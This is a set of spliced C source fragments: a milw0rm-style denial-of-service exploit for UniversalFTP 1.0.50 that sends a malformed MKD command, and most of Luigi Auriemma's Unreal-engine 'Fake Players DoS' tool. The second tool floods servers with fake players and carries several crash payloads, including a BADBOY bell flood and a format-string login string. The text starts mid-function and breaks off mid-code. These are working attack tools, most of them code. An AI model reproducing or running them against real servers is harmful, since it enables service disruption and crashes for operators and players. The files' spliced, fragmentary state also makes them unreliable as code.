    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            fprintf(stderr, "\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
=============================================================
DoS Exploit for UniversalFTP version 1.0.50
=============================================================
UniversalFTP (www.teamtek.net)
http://www.5e5.net/cgi-bin/download3.asp
Suffers from several unhandled user input vulnerabilities that
cause the program to crash.

I originally found this vulnerability on October 27th  and wrote
this but got caught up working with the Renasoft PSS Exploit
and forgot to report it.

The vulnerability was posted to secunia by Parvez Anwar November
13th - good job and thanks to him :).



*/



#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#define BUFF_SIZE 1024

#pragma comment(lib,"wsock32.lib")

int main(int argc, char *argv[])
{
WSADATA wsaData;
char buffer[BUFF_SIZE];

struct hostent *hp;
struct sockaddr_in sockin;
char buf[300], *check, *cmd;
int sockfd, bytes;
int i;
char *hostname;
unsigned short port;

if (argc <= 1)
  {
         printf("\n==================================================================\n");
         printf("UniversalFTP v1.0.50 Denial Of Service PoC Code\n");
         printf("Discovered By: Parvez Anwar and Greg Linares (glinares.code
[at ] gmail [dot] com)\n");
         printf("Original Reported By: Parvez Anwar\n");
     printf("Usage: %s [hostname] [port]\n", argv[0]);
     printf("default port is 21 \n");
         printf("====================================================================\n");
     exit(0);
  }

cmd = argv[3];
hostname = argv[1];
if (argv[2]) port = atoi(argv[2]);
else port = atoi("21");

if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
  {
     fprintf(stderr, "Error setting up with WinSock v1.1\n");
     exit(-1);
  }


  hp = gethostbyname(hostname);
  if (hp == NULL)
  {
     printf("ERROR: Uknown host %s\n", hostname);
         printf("%s",hostname);
     exit(-1);
  }

  sockin.sin_family = hp->h_addrtype;
  sockin.sin_port = htons(port);
  sockin.sin_addr = *((struct in_addr *)hp->h_addr);

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
  {
     printf("ERROR: Socket Error\n");
     exit(-1);
  }

  if ((connect(sockfd, (struct sockaddr *) &sockin,
               sizeof(sockin))) == SOCKET_ERROR)
  {
     printf("ERROR: Connect Error\n");
     closesocket(sockfd);
     WSACleanup();
     exit(-1);
  }

  printf("Connected to [%s] on port [%d], sending exploit....\n",
         hostname, port);


  if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
  {
     printf("ERROR: Recv Error\n");
     closesocket(sockfd);
     WSACleanup();
     exit(1);
  }

  // wait for SMTP service welcome

  buf[bytes] = '\0';
  check = strstr(buf, "2");
  if (check == NULL)
  {
     printf("ERROR: NO  response from SMTP service\n");
     closesocket(sockfd);
     WSACleanup();
     exit(-1);
  }
  printf("%s\n", buf);



  char Exploit[] = "MKD \\..\\******\\|\\******";


  send(sockfd, Exploit, strlen(Exploit),0);
  Sleep(1000);
  printf("[*] FTP DoS Packet Sent\n");

  closesocket(sockfd);
  WSACleanup();
}

// milw0rm.com [2006-11-15]
/*
    Copyright 2008,2009,2010 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl-2.0.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>
#include "rwbits.h"
#include "show_dump.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define sleepms sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
    #define sleepms(X)  sleep((X) * 1000)
#endif

#ifdef WIN32
    #define quick_thread(NAME, ARG) DWORD WINAPI NAME(ARG)
    #define thread_id   DWORD
#else
    #define quick_thread(NAME, ARG) void *NAME(ARG)
    #define thread_id   pthread_t
#endif

thread_id quick_threadx(void *func, void *data) {
    thread_id       tid;
#ifdef WIN32
    if(!CreateThread(NULL, 0, func, data, 0, &tid)) return(0);
#else
    pthread_attr_t  attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if(pthread_create(&tid, &attr, func, data)) return(0);
#endif
    return(tid);
}

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.2.4"
#define PORT        7777
#define BUFFSZ      1024    // the max supported is 576
#define MAXALLGUIDS 128
#define HELLBELL    "BADBOY " \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a"

#define UT2_QUERY   "\x79\x00\x00\x00\x00"  // not used
#define GS1_QUERY   "\\info\\"              // \status\ returns 3 packets, I'm too lazy to handle all of them
#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00"                    "\xff\x00\x00" "\x00"
#define GS3_QUERY   "\xfe\xfd\x09" "\x00\x00\x00\x00"
#define GS3_QUERYX  "\xfe\xfd\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" "\xff\x00\x00" "\x00"



enum EChannelType {     // Unreal public source code 224v
    CHTYPE_None = 0, // Invalid type.
    CHTYPE_Control = 1, // Connection control.
    CHTYPE_Actor = 2, // Actor-update channel.
    CHTYPE_File = 3, // Binary file transfer.
    CHTYPE_MAX = 8, // Maximum.
}; 

typedef struct {
    int     AckPacketId;
    int     ChIndex;
    int     ChType;
    int     ChSequence;
    int     PacketId;
    u8      bOpen;
    u8      bClose;
    u8      bReliable;
} bunch_t;



int udp_sock(int forced_port) {
    static struct   sockaddr_in *peerl = NULL;
    static struct   linger  ling = {1,1};
    static int      on = 1;
    int     sd;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on));
    //setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));

    // must change port everytime
    if(!peerl) {
        peerl = malloc(sizeof(struct sockaddr_in));
        peerl->sin_addr.s_addr = INADDR_ANY;
        peerl->sin_port        = htons(~time(NULL));
        peerl->sin_family      = AF_INET;
    }
    if(forced_port <= 0) {
        peerl->sin_port++;  // for the next
    } else {
        peerl->sin_port = htons(forced_port);
    }
    while(bind(sd, (struct sockaddr *)peerl, sizeof(struct sockaddr_in)) < 0) {
        peerl->sin_port++;  // yeah on little endian it's not sequential and this is what I want
    }
    return(sd);
}
void fake_players_socket(int sd) {  // simple to add function for not closing sockets
    #define MAXFAKESOCKS    256
    static int  socks[MAXFAKESOCKS],
                socksp,
                init    = 1;
    int         i;

    if(init || (sd < 0)) {
        for(i = 0; i < MAXFAKESOCKS; i++) socks[i] = -1;
        socksp = 0;
        init   = 0;
        return;
    }
    if(socksp >= MAXFAKESOCKS) socksp = 0;
    if(socks[socksp] >= 0) close(socks[socksp]);
    socks[socksp] = sd;
    socksp++;
}
void hex2guid(u8 *in, u8 *out);
u8 *hex2str(u8 *in, int *outsz);
u8 hex2byte(u8 *hex);
quick_thread(client, int sd);
void activate_fix(int *fix);
int unreal_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int *chall, u8 **errmsg);
u8 *rndhash(int size);
int unreal_info(struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
void fgetz(u8 *data, int len);
int calc_authresp(int num);
int write_unrnum(int num, u8 *buff, int bits);
int read_unrnum(int *num, u8 *buff, int bits);
int write_unrser(int num, u8 *buff, int bits, int max);
u8 *unreal_parse_pck(u8 *buff, int size, int *chall, u8 *ret_buff);
int unreal_build_pck(u8 *buff, int pck, int channel, ...);
int read_unreal_index(u8 *index_num, int *ret);
int write_unreal_index(int number, u8 *index_num);
u32 read_bitx(u32 bits, u8 *in, u32 *in_bits);
int read_bitmem(u8 *in, int inlen, u8 *out, int bits);
int write_bitmem(u8 *in, int inlen, u8 *out, int bits);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int     aafix           = 0,    // America's Army uses 0x800 instead of 0x3ff
        aa3fix          = 0,    // America's Army 3
        u3fix           = 0,    // Unreal 3 no longer uses index numbers
        rvfix           = 0,    // RavenShield uses 0x50f instead of 0x3ff (this is useless since it's compatible with AA)
        pariahfix       = 0,    // Pariah / Warpath
        movfix          = 0,    // Men of Valor / Star Wars Republic Commando
        unreal1fix      = 0,    // Unreal 1
        vegasfix        = 0,    // Demonware AGORA, Rainbow Six Vegas 2 (maybe Vegas 1 too?)
        devafix         = 0,    // Devastation
        biafix          = 0,    // Brothers in Arms (EiB)
        // khgfix          = 0, // Klingon Honor Guard uses readbits 16 1 9 16 3 and 12 instead of index numbers
        verbose         = 0,
        challenge_fix   = 0,
        hex_challenge   = 0,
        force_team      = 0,
        force_fix       = 0,
        send_verbose    = 0,
        send_hexdump    = 0,
        fast_connect    = 1,    // now disabled by default because is not possible to know if the server supports or not this method, use -F
        force_fast      = 0,    // do NOT touch!
        force_full      = 0,    // do NOT touch!
        first_time      = 1,
        bug             = 0,
        enable_bug      = 0;
u8      *gamestatefix[] = {
        "", // none
            // the order of the hash of GAMESTATE checked in memory is 77778888555566661111222233334444
            // the second part of the GAMESTATE hash is the MD5 of "SCR3W3DD@P00CH" and the MD5 of the file (for example SwatGame.u)
            // Swat4 requires 32 successful GAMESTATEs, it's enough to send the same one 32 times plus the other GAMECONFIG command
        "GAMESTATE FA1F998D4D4C2E5F492B79FF1D58488E5e2b7c57161e65909c8c7b01923aa4c4",   // UT2XMP demo
        "GAMESTATE 520996A03FACE2BE4FF9A24F17158B3B7c07dc2b72044ef0e6278707e9e8b0f6",   // UT2003
        // "GAMESTATE D2ECC882E8945E68413DDF3DCB7A1BBEfe95745de189869e61331593a64f33de",   // SWAT4
        NULL
        };

static const u8 x_option[] =
            "          1 = America's Army     2 = Unreal 3 engine    3 = Unreal 1\n"
            "          4 = Pariah/WarPath     5 = Men of Valor/SWRC  6 = Raven Shield\n"
            "          7 = America's Army 3   8 = Vegas 2 (DW AGORA) 9 = Devastation\n"
            "          10= Brothers in Arms\n";
static const u8 B_option[] =
            "          1  = \"NumInRec<=RELIABLE_BUFFER\" bug (unreliable)\n"
            "          2  = SWAT4 bug A (swat4x)\n"
            "          3  = SWAT4 bug B (swat4x)\n"
            "          4  = -d all (unreaload)\n"
            "          5  = America's Army 3 (aa3boh)\n"
            "          6  = Tripwire games (tripwireless)\n"
            "          7  = unroldcrash, bug B\n"
            "          8  = (unrhellbell, same as -b)\n"
            "          9  = Warpath/Pariah DoS (warpariahdos)\n"
            "          10 = format string (unrfs)\n"
            "          11 = JOINSPLIT server full with one player\n"
            "          12 = Unreal Tournament 3 <= 2.1 (ut3steamer)\n";



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u32     oldtime;
    int     i,
            sd,
            len,
            pck             = 0,
            ver             = 0,
            chall           = 0,
            all_guidsn      = 0,
            sendbytes_strn  = 0,
            sendbytes_chan  = 0,
            sendbytes_times = 0,
            interactive     = 0,
            onlyone         = 0,
            infoquery       = 1,
            sendauth        = 0,
            gamestatefixn   = 0,
            random_username = 0,
            force_closesock = 0,
            download_all    = 0,
            waitdelay       = 0,
            loop            = 0,
            force_fix_on    = 0;
    u16     port            = PORT,
            myport          = 0;
    u8      all_guids[MAXALLGUIDS][16],
            //buff[BUFFSZ + 1],
            *buff           = NULL,
            hello[BUFFSZ+1] = "",
            auth[BUFFSZ+1]  = "",
            login[BUFFSZ+1] = "",
            input[BUFFSZ+1] = "",
            hellover[64+1]  = "",
            pass[64+1]      = "",
            tmpchall[12+1]  = "",
            *cmd_only       = NULL,
            *cmd_plus       = "",
            *login_plus     = "",
            *pete_pkt       = "PETE PKT=1 PKG=1",
            *repeat         = "REPEAT",
            *critobjcnt     = "CRITOBJCNT 1",
            *download_guid  = NULL,
            *sendbytes_str  = NULL,
            *errmsg,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Unreal engine basic client and Fake Players DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s [options] <host> <port>\n"
            "\n"
            "Options:\n"
            "-c \"C\"    send only the custom command C, use -s for multiple commands\n"
            "-C \"C\"    send the custom command C plus the others needed to join\n"
            "-l \"S\"    add a custom URL string S to the LOGIN command, for example:\n"
            "          -l \"Index.ut2?Name=player?Class=EnginePawn?Character=Jakob?team=1\"\n"
            "          -l \"?Name=player?UserName=UserName?MAC=\"\n"
            "          -l \"ui_bink_master?Name=player?team=0?Face=0\"\n"
            //"          -l \"Entry.aao?Name=Recruit?Class=AGP_Characters.AGP_Character?team=255?UserName=UserName?MAC=\"\n"
            "-v        verbose mode, show all the commands received from the server\n"
            "-V        show all the commands sent by this tool, use -D for the hex dump of\n"
            "          the outgoing packet\n"
            "-I        experimental interactive mode for sending custom commands (debug)\n"
            "-x N      force the activation of a specific compatibility fix, where N is for:\n"
            "%s"
            "-d GUID   request the downloading of the file which has a specific GUID\n"
            "          use the GUID \"ALL\" for requesting all the files in use on the server\n"
            "-s S C N  send a sequence of bytes S to channel C N times, examples:\n"
            "          -s \"11 22 33 44556677  888\" 2 1\n"
            "          -s \"JOIN\" 1 1000 (channel 1 is the only one in text format)\n"
            "-F        force the fast method which allows to test this tool with servers\n"
            "          protected by password without knowing the keyword (not all the games)\n"
            "-X MS     fake players join and exit continuosly within MS milliseconds\n"
            "-b        Windows dedicated server hell bell attack through the BADBOY command\n"
            "-B NUM    choose a particular bug to test, the name within () is my advisory:\n"
            "%s"
            "\n"
            "Rarely useful options:\n"
            "-i        do NOT query the server for informations and for hostport\n"
            "-u        force the sending of a LOGIN command with a random UserName field\n"
            "          like for America's Army (automatic)\n"
            "-a        force the sending of the AUTH command (automatic)\n"
            "-1        only one fake player, debug\n"
            "-f        use the full method (HELLO + LOGIN and so on), needed with some games\n"
            "          of the Unreal 1 engine to avoid the crash of the server (automatic)\n"
            "-P PORT   force the usage of the local source port PORT\n"
            "\n", argv[0], x_option, B_option);
        exit(1);
    }

    argc -= 2;
    for(i = 1; i < argc; i++) {
        if(((argv[i][0] != '-') && (argv[i][0] != '/')) || (strlen(argv[i]) != 2)) {
            printf("\nError: wrong argument (%s)\n", argv[i]);
            exit(1);
        }
        switch(argv[i][1]) {
            case 'v': verbose       = 1;                break;
            case 'V': send_verbose  = 1;                break;
            case 'D': send_hexdump  = 1;                break;
            case 'f': force_full    = 1;                break;
            case 'c': cmd_only      = argv[++i];        break;
            case 'C': cmd_plus      = argv[++i];        break;
            case 'l': {
                login_plus          = argv[++i];
                fast_connect        = 0;
                break;
            }
            case '1': onlyone       = 1;                break;
            case 'i': infoquery     = 0;                break;
            case 'a': sendauth      = 1;                break;
            case 'b': {
                cmd_only            = HELLBELL;
                force_closesock     = 1;
                break;
            }
            case 'u': {
                random_username     = 1;
                fast_connect        = 0;
                break;
            }
            case 'x': {
                force_fix = atoi(argv[++i]);
                if(force_fix <= 0) {
                    printf("Available compatibility fixes for -x:\n%s\n", x_option);
                    exit(1);
                }
                break;
            }
            case 'I': interactive   = 1;                break;
            case 'd': download_guid = argv[++i];        break;
            case 's': {
                sendbytes_str       = argv[++i];
                sendbytes_chan      = atoi(argv[++i]);
                sendbytes_times     = atoi(argv[++i]);
                break;
            }
            case 'F': force_fast    = 1;                break;
            case 'X': {
                waitdelay           = atoi(argv[++i]);
                force_closesock = 1;
                break;
            }
            case 'B': {
                bug = atoi(argv[++i]);
                if(bug <= 0) {
                    printf("Available bugs for -B:\n%s\n", B_option);
                    exit(1);
                }
                break;
            }
            case 'P': myport        = atoi(argv[++i]);  break;
            default: {
                printf("\nError: wrong argument (%s)\n", argv[i]);
                exit(1);
            }
        }
    }
    if(i > argc) {
        printf("\nError: recheck your options, you have missed one or more parameters\n");
        exit(1);
    }

    host = argv[argc];
    port = atoi(argv[argc + 1]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    //peerl.sin_addr.s_addr = INADDR_ANY;
    //peerl.sin_port        = htons(time(NULL));
    //peerl.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(0xffff);
    if(!buff) std_err();

    switch(bug) {
        case 1: /* done later */ break;
        case 2: cmd_only = "VERIFYCONTENT"; break;
        case 3: cmd_plus = "GAMESPYRESPONSE RS=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; break;
        case 4: download_guid = "all"; break;
        case 5: {
            force_fix       = 7;
            sendbytes_str   = "JOINSPLIT";
            sendbytes_chan  = 1;
            sendbytes_times = 100;
            login_plus      = "ui_bink_master?Name=player?team=0?Face=0";
            fast_connect    = 0;
            break;
        }
        case 6: cmd_only = "STEAMCLIENTBLOB"; break;
        case 7: force_full = 1; break;
        case 8: {
            cmd_only        = HELLBELL;
            force_closesock = 1;
            break;
        }
        case 9: cmd_only = "DISABLESPLIT GAMEPAD=0"; break;
        case 10: {
            login_plus   = "?Class=%n%n%n%n%s%s%n%n%s%s";
            fast_connect = 0;
            break;
        }
        case 11: {
            onlyone         = 1;
            force_fix       = 2;
            sendbytes_str   = "JOINSPLIT";
            sendbytes_chan  = 1;
            sendbytes_times = 64;
            login_plus      = "ui_bink_master?Name=player?team=0?Face=0";
            fast_connect    = 0;
            break;
        }
        case 12: {
            force_fix = 2;
            cmd_only  = "STEAMBLOB B=";
            break;
        }
        default: break;
    }

    if(infoquery && (ntohs(peer.sin_port) != 7777)) {
        ver = unreal_info(&peer);
        if(ver) sprintf(hellover, "MINVER=%d VER=%d", ver, ver);
    }

        /* full list of parameters and values parsed by various games which use the Unreal engine
        USERFLAG (number)
        HELLO
            MINVER=
            VER=
        AUTH
            HASH=
            RESPONSE=
            USERNAME=
            PASSWORD=
            GM=
        NETSPEED (number >= 1800)
        HAVE
            GUID=
            GEN=
        SKIP
            GUID=
        LOGIN
            RESPONSE=
            URL=
        JOIN
        BADBOY (followed by the string visualized in the console)
        PETE
            PKT=
            PKG=
        REPEAT
        OPENVOICE (number)
            // UT2003
        CRITOBJCNT (number, similar to PETE)
        GAMESTATE (ID)
            NAME=
            // SWAT4
        GAMESPYRESPONSE
            RS=
        GAMESPYSTATRESPONSE
            PID=
            RS=
        VERIFYCONTENT
            FILE=
            MD5=
        GAMECONFIGCOUNT (number)
        GAMECONFIG
            CONFIGFILE=
            CONFIGMD5=
            // Warpath and Pariah
        JOINSPLIT
            GAMEPAD=
            GUESTNUM=
        DISABLESPLIT
            GAMEPAD=
        EPIC (hash)
            // Raven Shield
        SERVERPING
        ARMPATCH
            // UT3
        DEBUG
        ABORT
            GUID=
        JOINSPLIT
        */
        // generic in-game commands: open namecount start map servertravel say disconnect

    if(force_fast) {
        fast_connect = 1;
        force_full   = 0;
    } else if(force_full) {
        fast_connect = 0;
        force_fast   = 0;
    }
    if(cmd_plus && !strncmp(cmd_plus, "PETE ", 5))       pete_pkt   = "";
    if(cmd_plus && !strncmp(cmd_plus, "REPEAT ", 7))     repeat     = "";
    if(cmd_plus && !strncmp(cmd_plus, "CRITOBJCNT", 10)) critobjcnt = "";
    if(download_guid) {
        if((download_guid[0] == '*') || !stricmp(download_guid, "ALL")) {
            download_guid = NULL;
            download_all  = 1;
        } else {
            p = malloc(16);
            hex2guid(download_guid, p);
            download_guid = p;
        }
    }
    if(sendbytes_str) {
        if(sendbytes_chan == CHTYPE_Control) {
            sendbytes_strn = strlen(sendbytes_str);
        } else {
            sendbytes_str = hex2str(sendbytes_str, &sendbytes_strn);
        }
    }

    printf("\n- start attack:\n");

    if(force_fix) {
        force_fix_on = force_fix;
        sd = udp_sock(myport);
        errmsg = unreal_parse_pck("\x80\x80", 1, NULL, NULL);
        force_fix = 0;
        goto handle_error_message;
    }

    for(;;) {
        printf("\n  Player: ");
        pck = 0;
        sd = udp_sock(myport);

        /* NEVER enable because HELLO is ever needed otherwise the server doesn't accept the commands
        if(cmd_only && force_fix_on) {
            // if the user specifies -x and -c then avoid the guessing of the fixes?
        } else */
        if(
           bug || interactive ||    // needed otherwise is not possible to guess the work-around
           !fast_connect || u3fix || movfix || aa3fix) {    // Unreal 3 requires the LOGIN packet, while MOV crashes!
            sprintf(hello, "HELLO %sREVISION=0 %s", (u3fix || aa3fix) ? "P=1 " : "", hellover);

            len = unreal_build_pck(buff, pck++, CHTYPE_Control, hello, NULL);
            len = unreal_send_recv(sd, buff, len, buff, 0xffff, &peer, &chall, &errmsg);
            if(len < 0) goto handle_error_message;

            sprintf(tmpchall, hex_challenge ? "%08X" : "%i", chall);    // I don't know if this is right, seems that U3 doesn't check the challenge!
            //sprintf(login, "LOGIN RESPONSE=%i URL=Index.ut2?Name=player?Class=EnginePawn?Character=Jakob?team=1%s%s", chall, pass[0] ? "?password=" : "", pass);
            sprintf(login, "LOGIN RESPONSE=%s URL=%s%s%s%s", tmpchall, login_plus, force_team ? "?Team=1" : "", pass[0] ? "?password=" : "", pass);
            if(random_username) sprintf(login + strlen(login), "?UserName=%s", rndhash(5));
        }

        if(sendauth) {
            sprintf(auth, "AUTH HASH=%s GM=%s USERNAME=%s PASSWORD=%s", rndhash(16), rndhash(66), rndhash(4), rndhash(16));
        }

        if(bug == 1) {
            enable_bug = 1;
            printf("\n- \"NumInRec<=RELIABLE_BUFFER\" bug:\n");
            for(i = 0; i < 256; i++) {  // 128 was enough
                len = unreal_build_pck(buff, pck++, CHTYPE_Control, "", NULL);
                len = unreal_send_recv(sd, buff, len, NULL, 0, &peer, NULL, &errmsg);
                if(len < 0) break;
                sleepms(waitdelay ? waitdelay : 20);
            }
            close(sd);
            printf("\n- done\n");
            return(0);
        }

        if(interactive) {
            loop = 1;
            verbose = 1;
            quick_threadx(client, (void *)sd);
            printf("\n"
                "- insert the desired Unreal commands (like AUTH, JOIN, HAVE, SKIP and so on)\n"
                "  use the command unrealfp_hello to send a new HELLO (if server doesn't reply)\n"
                "  use the command unrealfp_socket to use a new socket\n"
                "  use the command unrealfp_port PORT to use a new socket on source port PORT\n"
                "  use the command unrealfp_loop NUM to send the next command NUM times\n"
                "\n");
            for(;;) {
                fgetz(input, sizeof(input));
                p = strchr(input, ' ');
                if(p) *p = 0;
                if(!stricmp(input, "unrealfp_hello")) {
                    strcpy(input, hello);
                    p = NULL;
                    //continue; // do not continue, send it
                } else if(!stricmp(input, "unrealfp_socket") || !stricmp(input, "unrealfp_sock")) {
                    close(sd);
                    pck = 0;
                    sd = udp_sock(myport);      // you can't recvfrom on an unconnected socket
                    connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
                    quick_threadx(client, (void *)sd);
                    continue;
                } else if(!stricmp(input, "unrealfp_port") && p) {
                    close(sd);
                    pck = 0;
                    sd = udp_sock(atoi(p + 1)); // you can't recvfrom on an unconnected socket
                    connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
                    quick_threadx(client, (void *)sd);
                    continue;
                } else if(!stricmp(input, "unrealfp_loop") && p) {
                    loop = atoi(p + 1);
                    continue;
                }
                if(p) *p = ' ';

                len = 0;
                for(i = 0; i < loop; i++) {
                    len = unreal_build_pck(buff, pck++, CHTYPE_Control, input, NULL);
                    len = unreal_send_recv(sd, buff, len, NULL, 0, &peer, NULL, &errmsg);
                    if(len < 0) break;
                    if(i) sleepms(waitdelay ? waitdelay : 20);
                }
                if(len < 0) break;
                loop = 1;
            }
            close(sd);
            printf("\n- done\n");
            return(0);
        }

        if(cmd_only) {
            len = unreal_build_pck(buff, pck++, CHTYPE_Control, cmd_only, NULL);
        } else {
            len = unreal_build_pck(buff, pck++, CHTYPE_Control,
                auth,   // causes only problems!
                login,
                //"NETSPEED 1800",    // useless
                cmd_plus,
                pete_pkt,
                repeat,
                critobjcnt,
                gamestatefix[gamestatefixn],
                "JOIN",
                NULL);
        }
        len = unreal_send_recv(sd, buff, len, buff, 0xffff, &peer, NULL, &errmsg);
        if(len < 0) goto handle_error_message;

        if(sendbytes_str) {
            printf("\n- send %d custom bytes to channel %d for %d times\n", sendbytes_strn, sendbytes_chan, sendbytes_times);
            for(i = 0; i < sendbytes_times; i++) {
                if(sendbytes_chan == CHTYPE_Control) {
                    len = unreal_build_pck(buff, pck++, sendbytes_chan, sendbytes_str, NULL);
                } else {
                    len = unreal_build_pck(buff, pck++, sendbytes_chan, sendbytes_str, sendbytes_strn, NULL);
                }
                len = unreal_send_recv(sd, buff, len, buff, 0xffff, &peer, NULL, &errmsg);
                if(len < 0) goto handle_error_message;
            }
        }
        if(download_guid) {
            len = unreal_build_pck(buff, pck++, CHTYPE_File, download_guid, 16, NULL);
            len = unreal_send_recv(sd, buff, len, buff, 0xffff, &peer, NULL, &errmsg);
            if(len < 0) goto handle_error_message;
        }
        if(download_all) {
            all_guidsn = 0;
            printf("\n- collect GUIDs available on the server");
            for(;;) {
                if(!buff[0]) break;
                for(p = buff; (p = strstr(p, "USES GUID=")); p++) {   // stuff received before
                    if(all_guidsn >= MAXALLGUIDS) continue;
                    hex2guid(strchr(p, '=') + 1, all_guids[all_guidsn]);
                    all_guidsn++;
                }
                len = unreal_send_recv(sd, NULL, 0, buff, 0xffff, &peer, NULL, &errmsg);
                if(len < 6) break;  // fast way
            }
            for(oldtime = i = 0; i < all_guidsn;) {
                if(time(NULL) >= oldtime) {
                    oldtime = time(NULL) + 1;
                    p = all_guids[i];
                    printf("\n- request GUID %d: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
                        i,
                        p[3],  p[2],  p[1],  p[0],
                        p[7],  p[6],  p[5],  p[4],
                        p[11], p[10], p[9],  p[8],
                        p[15], p[14], p[13], p[12]);
                    len = unreal_build_pck(buff, pck++, CHTYPE_File, all_guids[i], 16, NULL);
                    len = unreal_send_recv(sd, buff, len, buff, 0xffff, &peer, NULL, &errmsg);
                    i++;
                } else {
                    len = unreal_send_recv(sd, NULL, 0, buff, 0xffff, &peer, NULL, &errmsg);
                }
                if(len < 0) goto handle_error_message;
            }
        }

        if(onlyone) {
            if(verbose) {
                for(;;) {   // show any other incoming message
                    if(!buff[0]) break;
                    len = unreal_send_recv(sd, NULL, 0, buff, 0xffff, &peer, NULL, &errmsg);
                    if(len < 6) break;  // fast way
                }
            }
            close(sd);
            printf("\n- done\n");
            exit(1);
        }

        if(force_closesock) {
            close(sd);
            sleepms(waitdelay);
        } else {
            fake_players_socket(sd);
        }
        continue;

handle_error_message:
        close(sd);
        if(!errmsg) continue;
        if(strstr(errmsg, "UPGRADE")) {
            p = strstr(errmsg, "MINVER");   // UPGRADE MINVER= VER=
            if(!p) exit(1);
            strncpy(hellover, p, sizeof(hellover));
            hellover[sizeof(hellover) - 1] = 0;
        } else if(strstr(errmsg, "SERVERFULL") || stristr(errmsg, "capacity") || stristr(errmsg, "MaxedOutMessage") || stristr(errmsg, "players") || !strcmp(errmsg, "FAILURE ")) {
            printf(" server full ");
            for(i = 3; i; i--) {
                printf("%d\b", i);
                sleep(ONESEC);
            }
        } else if(strstr(errmsg, "NEEDPW") || strstr(errmsg, "WRONGPW") || stristr(errmsg, "password") || stristr(errmsg, "PassWd")) {
            printf("\n- server is protected with password, insert the keyword: ");
            fgetz(pass, sizeof(pass));
        } else if(strstr(errmsg, "BRAWL")) {
            gamestatefixn++;
